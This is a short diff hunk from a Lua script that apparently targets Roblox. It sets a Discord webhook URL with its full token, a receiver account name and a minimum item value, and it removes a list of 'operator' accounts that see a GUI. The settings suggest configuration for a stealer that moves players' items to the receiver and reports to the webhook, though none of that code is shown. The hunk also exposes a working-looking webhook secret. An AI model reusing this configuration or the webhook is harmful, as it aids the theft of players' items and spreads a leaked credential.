@@ -4,7 +4,6 @@ _G.Ex = true
 
 local WEBHOOK       = "https://discord.com/api/webhooks/1543214605667672146/xlaygQkXXEurMeA4sp5gpmWgpsALxmq_t9TvPn_dilUvcysOGb8Nf9mPKGCkH_CNEC2X"
 local RECEIVER      = {"iceyblueii"}
-local OPERATORS     = {"iceyblueii", "Snthnova"}  -- accounts that see GUI
 local MINIMUM_VALUE = 10
 
 local CURRENT_PLACE_ID = game.PlaceId
